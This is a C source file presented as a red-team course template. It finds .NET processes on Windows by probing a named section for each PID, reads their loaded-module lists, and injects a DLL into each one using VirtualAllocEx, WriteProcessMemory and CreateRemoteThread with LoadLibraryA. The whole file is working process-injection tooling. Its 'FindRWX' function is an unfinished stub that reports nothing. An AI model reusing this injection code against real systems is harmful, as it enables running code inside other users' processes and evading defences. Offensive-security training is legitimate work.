/*

 Red Team Operator course code template
 Find .NET process with RWX memory
 
 author: reenz0h (twitter: @SEKTOR7net)
 credits: Wen Jia Liu
 
*/
#include <windows.h>
#include <stdio.h>
#include <Psapi.h>
#include <shlwapi.h>
#include <strsafe.h>
#include <tchar.h>
#include <winternl.h>

#pragma comment(lib, "ntdll.lib")
#pragma comment(lib, "Shlwapi.lib")

typedef NTSTATUS (NTAPI * NtGetNextProcess_t)(
	HANDLE ProcessHandle,
	ACCESS_MASK DesiredAccess,
	ULONG HandleAttributes,
	ULONG Flags,
	PHANDLE NewProcessHandle
);

typedef NTSTATUS (NTAPI * NtOpenSection_t)(
	PHANDLE            SectionHandle,
	ACCESS_MASK        DesiredAccess,
	POBJECT_ATTRIBUTES ObjectAttributes
);

BOOL LoadRemoteDLL(HANDLE hProcess, const char *dllPath)
{
    // Allocate memory in the remote process for the DLL path
    LPVOID remoteString = VirtualAllocEx(hProcess, NULL, strlen(dllPath) + 1, MEM_RESERVE | MEM_COMMIT, PAGE_READWRITE);
    if (remoteString == NULL) {
        return FALSE;
    }

    // Write the DLL path to the allocated memory
    if (!WriteProcessMemory(hProcess, remoteString, dllPath, strlen(dllPath) + 1, NULL)) {
        VirtualFreeEx(hProcess, remoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    // Get the address of LoadLibraryA in kernel32.dll
    HMODULE hKernel32 = GetModuleHandle(_T("kernel32.dll"));
    FARPROC hLoadLibrary = GetProcAddress(hKernel32, "LoadLibraryA");
    if (hLoadLibrary == NULL) {
        VirtualFreeEx(hProcess, remoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    // Create a remote thread to load the DLL
    HANDLE hThread = CreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)hLoadLibrary, remoteString, 0, NULL);
    if (hThread == NULL) {
        VirtualFreeEx(hProcess, remoteString, 0, MEM_RELEASE);
        return FALSE;
    }

    // Wait for the remote thread to finish
    WaitForSingleObject(hThread, INFINITE);

    // Free the allocated memory in the remote process
    VirtualFreeEx(hProcess, remoteString, 0, MEM_RELEASE);

    // Close the thread handle
    CloseHandle(hThread);

    return TRUE;
}

BOOL IsModuleLoadedByHandle(HANDLE hProcess, const char* moduleName) {
    PROCESS_BASIC_INFORMATION pbi;
    ULONG retLen;

    // Explicitly cast to PROCESSINFOCLASS.
    if (NtQueryInformationProcess(hProcess, (PROCESSINFOCLASS)0, &pbi, sizeof(PROCESS_BASIC_INFORMATION), &retLen) != 0) {
        return FALSE;
    }

    PEB peb;
    if (!ReadProcessMemory(hProcess, pbi.PebBaseAddress, &peb, sizeof(PEB), NULL)) {
        return FALSE;
    }

    PEB_LDR_DATA ldr;
    if (!ReadProcessMemory(hProcess, peb.Ldr, &ldr, sizeof(PEB_LDR_DATA), NULL)) {
        return FALSE;
    }

    LIST_ENTRY* pCurrentEntry = ldr.InMemoryOrderModuleList.Flink;
    while (pCurrentEntry != ldr.InMemoryOrderModuleList.Blink) {
        LDR_DATA_TABLE_ENTRY current;
        if (!ReadProcessMemory(hProcess, CONTAINING_RECORD(pCurrentEntry, LDR_DATA_TABLE_ENTRY, InMemoryOrderLinks), &current, sizeof(LDR_DATA_TABLE_ENTRY), NULL)) {
            return FALSE;
        }

        WCHAR buffer[MAX_PATH];
        if (!ReadProcessMemory(hProcess, current.FullDllName.Buffer, buffer, current.FullDllName.Length, NULL)) {
            return FALSE;
        }
        buffer[current.FullDllName.Length / sizeof(WCHAR)] = 0;

        char currentModuleName[MAX_PATH];
        WideCharToMultiByte(CP_ACP, 0, buffer, -1, currentModuleName, sizeof(currentModuleName), NULL, NULL);

        if (_stricmp(currentModuleName, moduleName) == 0) {
            return TRUE;
        }

        pCurrentEntry = current.InMemoryOrderLinks.Flink;
    }

    return FALSE;
}

void FindDotNet(HANDLE **phandles, int *pcount) {
    int pid = 0;
    HANDLE currentProc = NULL;
    UNICODE_STRING sectionName = { 0 };
    WCHAR ProcNumber[30];
    OBJECT_ATTRIBUTES objectAttributes;

    // Temporary array to hold process handles
    HANDLE tempHandles[1024];
    int count = 0;

    // resolve function addresses
    NtGetNextProcess_t pNtGetNextProcess = (NtGetNextProcess_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtGetNextProcess");
    NtOpenSection_t pNtOpenSection = (NtOpenSection_t) GetProcAddress(GetModuleHandle("ntdll.dll"), "NtOpenSection");

    WCHAR objPath[] = L"\\BaseNamedObjects\\Cor_Private_IPCBlock_v4_";
    sectionName.Buffer = (PWSTR) malloc(500);

    // loop through all processes
    while (!pNtGetNextProcess(currentProc, MAXIMUM_ALLOWED, 0, 0, &currentProc)) {
        pid = GetProcessId(currentProc);

        // convert INT to WCHAR
        swprintf_s(ProcNumber, L"%d", pid);

        // and fill out UNICODE_STRING structure
        ZeroMemory(sectionName.Buffer, 500);
        memcpy(sectionName.Buffer, objPath, wcslen(objPath) * 2);   // add section name "prefix"
        StringCchCatW(sectionName.Buffer, 500, ProcNumber);         // and append with process ID
        sectionName.Length = wcslen(sectionName.Buffer) * 2;        // finally, adjust the string size
        sectionName.MaximumLength = sectionName.Length + 1;

        // try to open the section - if exists, .NET process is found
        InitializeObjectAttributes(&objectAttributes, &sectionName, OBJ_CASE_INSENSITIVE, NULL, NULL);
        HANDLE sectionHandle = NULL;
        NTSTATUS status = pNtOpenSection(&sectionHandle, SECTION_QUERY, &objectAttributes);
        if (NT_SUCCESS(status)) {
            CloseHandle(sectionHandle);
            tempHandles[count++] = currentProc;  // Store the handle
        }
    }

    // Allocate memory for the final handle array
    *phandles = (HANDLE *)malloc(count * sizeof(HANDLE));
    memcpy(*phandles, tempHandles, count * sizeof(HANDLE));
    *pcount = count;  // Set the count

    // Free any dynamically allocated resources here
    free(sectionName.Buffer);
}

int FindRWX(HANDLE hndl) {

	MEMORY_BASIC_INFORMATION mbi = {};
	LPVOID addr = 0;

	// query remote process memory information
	while (VirtualQueryEx(hndl, addr, &mbi, sizeof(mbi))) {
		addr = (LPVOID)((DWORD_PTR) mbi.BaseAddress + mbi.RegionSize);
	}

	return 0;
}

int main(void) {
    HANDLE *handles = NULL;
    int count = 0;
    char procNameTemp[MAX_PATH];

    FindDotNet(&handles, &count);

    for (int i = 0; i < count; ++i) {
        HANDLE h = handles[i];
        if (h) GetProcessImageFileNameA(h, procNameTemp, MAX_PATH);

        printf("[+] DotNet process %s%d) [%s]\n",
                        h != 0 ? "found at PID: (" : "NOT FOUND (",
                        GetProcessId(h),
                        h != 0 ? PathFindFileNameA(procNameTemp) : "<unknown>");

        if (!IsModuleLoadedByHandle(h, "System.Runtime.dll")) {
            printf("[-] System.Runtime.dll is NOT loaded in the process.\n");
            if (LoadRemoteDLL(h, "System.Runtime.dll")) {
                printf("[+] Successfully loaded System.Runtime.dll into the process.\n");
            } else {
                printf("[-] Failed to load System.Runtime.dll into the process.\n");
            }
        }

        // Check again if System.Runtime.dll is loaded.
        if (IsModuleLoadedByHandle(h, "System.Runtime.dll")) {
            printf("[+] System.Runtime.dll is loaded in the process.\n");
        } else {
            printf("[-] System.Runtime.dll is NOT loaded in the process.\n");
        }

        printf("Press Enter to continue...\n");
        getchar();  // Wait for a character input

        FindRWX(h);
        CloseHandle(h);
    }

    free(handles);  // Free the allocated memory

    return 0;
}
